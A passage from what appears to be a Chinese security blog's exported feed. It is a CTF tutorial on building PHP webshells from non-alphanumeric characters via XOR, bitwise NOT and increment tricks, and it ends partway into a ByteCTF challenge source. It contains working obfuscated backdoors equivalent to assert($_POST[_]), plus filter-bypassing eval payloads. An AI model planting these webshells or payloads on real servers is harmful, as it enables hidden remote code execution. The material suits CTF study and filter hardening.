<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ByteCTF2019-ezcms">ByteCTF2019 ezcms</h2>
<p>题目地址：<a href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a></p>
]]></content>
  </entry>
  <entry>
    <title>PHP无数字字母构造webshell</title>
    <url>/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/</url>
    <content><![CDATA[<h1 id="PHP无数字字母构造webshell">PHP无数字字母构造webshell</h1>
<h2 id="0x01-从一道题目出发">0x01 从一道题目出发</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>分析代码可知</p>
<ul>
<li>只要执行getFlag()函数应该就可以得到flag了</li>
<li>但对code的长度限制&lt;40，并且code不能有数字和大小写字母</li>
</ul>
<h2 id="0x02-前置知识">0x02 前置知识</h2>
<h3 id="异或运算">异或运算</h3>
<p>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。</p>
<p>举个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A的ASCII值是65，对应的二进制值是01000001</span><br><span class="line">&#96;?的ASCII值是63，对应的二进制值是00111111</span><br></pre></td></tr></table></figure>
<p>异或的二进制的值是<code>01111110</code>，对应的ASCII值是126，对应的字符串的值就是<code>~</code>了。</p>
<p>再结合PHP弱类型的特点，可以将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function B()&#123;</span><br><span class="line">        echo &quot;Hello Angel_Kitty&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__&#x3D; &quot;?&quot; ^ &quot;&#125;&quot;;</span><br><span class="line">    $__();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>第5行代码对变量名为<code>_</code>的变量进行自增操作，在PHP中未定义的变量默认值为null（nullfalse0），我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。</p>
<p>第6行代码对字符<code>?</code>和<code>&#125;</code>进行异或操作，得到字符<code>B</code>赋值给变量名为<code>__</code>的变量。</p>
<p>第7行代码可以看作是执行<code>B()</code>，表示调用函数B,所以执行结果为<code>Hello Angel_Kitty</code>。</p>
<p>再看一个非数字字母的PHP后门：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; demo1.php</span><br><span class="line">&lt;?php</span><br><span class="line">    @$_++; &#x2F;&#x2F; $_ &#x3D; 1</span><br><span class="line">    $__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _</span><br><span class="line">    $__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P</span><br><span class="line">    $__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO</span><br><span class="line">    $__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS</span><br><span class="line">    $__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); &#x2F;&#x2F; $_POST[0]($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510130021.png" alt=""></p>
<p><code>_POST</code>的拼接可以将上面的代码合并为一行，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$__&#x3D;(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;&#x2F;&quot;^&quot;&#96;&quot;).(&quot;|&quot;^&quot;&#x2F;&quot;).(&quot;&#123;&quot;^&quot;&#x2F;&quot;);</span><br></pre></td></tr></table></figure>
<p>还可以用更短的字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot; &#x2F;&#x2F;_GET</span><br><span class="line">&quot;#.&#x2F;|&#123;&quot;^&quot;|~&#96;&#x2F;&#x2F;&quot; &#x2F;&#x2F;_POST</span><br></pre></td></tr></table></figure>
<h3 id="取反运算">取反运算</h3>
<p>来看一个汉字&quot;和&quot;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;))</span><br><span class="line">b&#39;\xe5\x92\x8c&#39;</span><br><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">140</span><br><span class="line">&gt;&gt;&gt; print(~&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">-141</span><br></pre></td></tr></table></figure>
<p><code>和</code>的第三个字节的值为140[0x8c]，取反的值为-141。<br>
负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为<code>0xff73</code>，php中<code>chr(0xff73)</code>==115，115就是s的ASCII值。<br>
因此</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;&quot;和&quot;;</span><br><span class="line">print(~($_&#123;2&#125;));</span><br><span class="line">print(~&quot;\x8c&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>两个写法性质一样，结果会输出：<code>ss</code></p>
<p>脚本生成payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; def get(shell):</span><br><span class="line">...     hexbit&#x3D;&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))</span><br><span class="line">...     print(hexbit)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; get(&#39;phpinfo&#39;)</span><br><span class="line">0x8f0x970x8f0x960x910x990x90</span><br></pre></td></tr></table></figure>
<h3 id="不用数字构造数字">不用数字构造数字</h3>
<p>主要思想就是，利用了PHP弱类型特性，true的值为1。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)</span><br><span class="line">print($_) &#x2F;&#x2F; 1</span><br><span class="line">print($_&#x2F;$_) &#x2F;&#x2F; 2</span><br></pre></td></tr></table></figure>
<blockquote>
<p>字符<code>&gt;</code>的ascii值大于<code>&lt;</code>ascii的值</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_++;</span><br><span class="line">print($_); &#x2F;&#x2F; 1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>php中未定义的变量默认值为null，nullfalse0</p>
</blockquote>
<h2 id="0x03-无数字字母构造webshell">0x03 无数字字母构造webshell</h2>
<p>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; demo2.php</span><br><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;shell&#39;])) &#123;</span><br><span class="line">  eval($_GET[&#39;shell&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>思路</p>
<p>将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如&quot;assert&quot;，然后动态执行即可。</p>
<blockquote>
<p>使用assert的话PHP版本必须小于等于7.0</p>
</blockquote>
<h3 id="利用异或操作">利用异或操作</h3>
<p>不可打印字符，用url编码表示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;); &#x2F;&#x2F; $_&#x3D;&#39;assert&#39;;</span><br><span class="line">$__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); &#x2F;&#x2F; $__&#x3D;&#39;_POST&#39;;</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]); &#x2F;&#x2F; assert($_POST[_]);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>查ascii码对照表可以发现，0x01 = 1 = SOH; 0x13 = 19 = DC3; 0x05 = 5 = ENQ等等</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510200554.png" alt="img"></p>
<p>如果要直接使用的话，必须对这些不可打印的特殊字符url编码，实际上木马应该是下面这个样子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(urldecode(&#39;%01&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%13&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%13&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%05&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%12&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%14&#39;)^&#39;&#96;&#39;);</span><br><span class="line">$__&#x3D;&#39;_&#39;.(urldecode(&#39;%0D&#39;)^&#39;]&#39;).(urldecode(&#39;%2F&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%0E&#39;)^&#39;]&#39;).(urldecode(&#39;%09&#39;)^&#39;]&#39;);</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]);&#x2F;&#x2F; assert($_POST[_]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510200142.png" alt="img"></p>
<h3 id="利用取反操作">利用取反操作</h3>
<p>利用的是UTF-8编码的某个汉字，将其中的某个字符取出来，取反为字母。一个汉字的utf8是三个字节，{2}表示第3个字节。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);&#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;&#x2F;&#x2F;$_&#x3D;1</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;</span><br><span class="line">$____&#x3D;&quot;和&quot;;</span><br><span class="line">print(~($___&#123;$_&#125;)); &#x2F;&#x2F; a</span><br><span class="line">print(~($____&#123;$__&#125;)); &#x2F;&#x2F; s</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);&#x2F;&#x2F;$__2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;&#x2F;&#x2F;$_1</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;的&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;半&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;始&quot;;$____.&#x3D;~($___&#123;$__&#125;);&#x2F;&#x2F;$____&#x3D;assert</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;俯&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;瞰&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;次&quot;;$_____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;站&quot;;$_____.&#x3D;~($___&#123;$_&#125;);&#x2F;&#x2F;$_____&#x3D;_POST</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;&#x2F;&#x2F;$_&#x3D;$_POST</span><br><span class="line">$____($_[$__]);&#x2F;&#x2F;assert($_POST[2])</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510205730.png" alt="img"></p>
<p>这里也有一种简短的写法<code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code>它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。</p>
<h3 id="利用递增操作符">利用递增操作符</h3>
<p>我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>
数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array。再取这个字符串的第一个字母，就可以获得’A’。</p>
<blockquote>
<p>因为PHP函数是大小写不敏感的，最终执行的是ASSERT($POST[])，无需获取小写a。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];</span><br><span class="line">$___&#x3D;$_; &#x2F;&#x2F; A</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++; &#x2F;&#x2F; E </span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;_&#39;;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$____;</span><br><span class="line">$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure>
<h2 id="0x04-回到最开始的那道题">0x04 回到最开始的那道题</h2>
<h3 id="异或方法">异或方法</h3>
<p>前面提到过<code>_GET</code>也可以这样拼接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$__&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;; &#x2F;&#x2F; $__&#x3D;&quot;_GET&quot;;</span><br></pre></td></tr></table></figure>
<p>按照这种方法，可以得到一种payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]();&amp;_&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<p>即<code>$&#123;$_&#125;[_]()</code> = <code>$_GET[_]()</code>，url传入<code>_=getFlag</code></p>
<blockquote>
<p>本文的后面解释了<code>$&#123;$_&#125;[_]()</code>中的<code>&#123;&#125;</code>的作用</p>
</blockquote>
<p>还有两种更直接的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();    &#x2F;&#x2F;$_&#x3D;&#39;getFlag&#39;</span><br><span class="line">?code&#x3D;$啊&#x3D;(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();</span><br></pre></td></tr></table></figure>
<p>相当于 <code>$啊=getFlag;$啊();</code></p>
<h3 id="取反方法">取反方法</h3>
<p>前面也提到过<code>$_GET</code>还有一种简短的写法<code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code></p>
<p>那么利用这种方式可得payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_(); &#x2F;&#x2F;%_为getFlag取反然后URL编码得结果</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<p>其中：<code>%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B</code> = <code>$_GET['+']</code></p>
<h2 id="0x05-进一步思考">0x05 进一步思考</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;50)&#123;</span><br><span class="line">        die(&quot;Too Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;Not Allowed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在上面一道题的基础上，又过滤了下划线<code>_</code>，意味着不能定义变量，而且也构造不出来数字。</p>
<p>首先看一个错误的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;(&#39;$&#39;).(&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;).([&#39;+&#39;])&amp;+&#x3D;getFlag();</span><br></pre></td></tr></table></figure>
<p>错误的原因是<strong>eval只能解析一遍代码，所以如果写的是a.b这样的字符串拼接，就只会执行这个拼接，并不会去执行代码</strong>。</p>
<p>例如：</p>
<p><code>eval($_GET['b'])</code> url里面 <code>b=phpinfo();</code> 这时候相当于<code>eval('phpinfo();')</code><br>
<code>eval($_GET['b'])</code> url里面<code>b=$_GET[c]&amp;c=phpinfo();</code> 相当于<code>eval('$_GET[c]')</code><br>
上面的payload是<code>code=$_GET['+']&amp;+=getFlag();</code> ，也就是<code>eval('$_GET['+'])</code>并不会执行<code>getFlag();</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;12354&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="string">&quot;getflag&quot;</span>;</span><br><span class="line">$b=<span class="string">&quot;()&quot;</span>;</span><br><span class="line">@<span class="keyword">eval</span>($a.$b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个代码不会输出任何结果。</p>
<p>正确的payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();&amp;+&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<p>这里利用了<code>$&#123;&#125;</code>中的代码是可以执行的特点，其实也就是可变变量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a &#x3D; &#39;hello&#39;;</span><br><span class="line">    $$a &#x3D; &#39;world&#39;;</span><br><span class="line">    echo &quot;$a $&#123;$a&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出<code>hello world</code>，<code>$&#123;$a&#125;</code>，括号中的<code>$a</code>是可以执行的，变成了hello。</p>
<blockquote>
<p>这也解释上面提到的为什么要加上<code>&#123;&#125;</code></p>
</blockquote>
<p>还可以使用取反的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<p>其中<code>24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B</code> = <code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code> = <code>$_GET</code></p>
<blockquote>
<p>~在{}中执行了取反操作</p>
</blockquote>
<p>另外上面提到过的一个payload仍然还是可以使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;$啊&#x3D;(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();</span><br></pre></td></tr></table></figure>
<p>这里就不需要用{}了，因为异或的值直接被当作字符串赋值给了$啊。</p>
<h2 id="0x06-最后的思考">0x06 最后的思考</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">    die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint&#x3D;&quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这道题进一步的过滤了<code>$</code>字符。</p>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;??? ????.???&#96;?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>前提是在Linux系统中</p>
</blockquote>
<p>首先<code>?&gt;</code>闭合php文件开头的<code>&lt;?php</code>，<code>&lt;?=</code>可以输出。</p>
<p><code>&lt;? ?&gt;</code>是短标签，<code>&lt;?php ?&gt;</code>是长标签。在php的配置文件<code>php.ini</code>中有一个<code>short_open_tag</code>的值，开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code>同时，只有开启这个才可以使用 <code>&lt;?=&gt;</code>以代替 <code>&lt;? echo</code> 。</p>
<p>另外，在linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用<code>? * %</code>等字符来替代，当然这里想要执行命令，需要极限的利用这个方法，经过测试：</p>
<p><code>/???/???</code>通配``/bin/cat<code>，</code>???.???<code>通配</code>flag.php`</p>
<h2 id="0x07-Reference">0x07 Reference</h2>
<p><a href="https://www.moonback.xyz/2019/10/16/nowords-webshell/">https://www.moonback.xyz/2019/10/16/nowords-webshell/</a></p>
<h2 id="0x08-Update">0x08 Update</h2>
<p><a href="https://guokeya.github.io/post/NIupiXpsi/">https://guokeya.github.io/post/NIupiXpsi/</a></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>web安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>从一道题学习PHP无参数函数的利用</title>
    <url>/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="从ByteCTF-boringcode-学习PHP无参数函数的利用">从ByteCTF boringcode 学习PHP无参数函数的利用</h1>
<h2 id="0x01-题目源码">0x01 题目源码</h2>
<p>题目环境：<a href="https://github.com/CTFTraining/bytectf_2019_web_boring_code">https://github.com/CTFTraining/bytectf_2019_web_boring_code</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span>(<span class="params">$url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/data:\/\//i&#x27;</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/baidu\.com$/&#x27;</span>, $r[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, $code)) &#123;</span><br><span class="line">                    <span 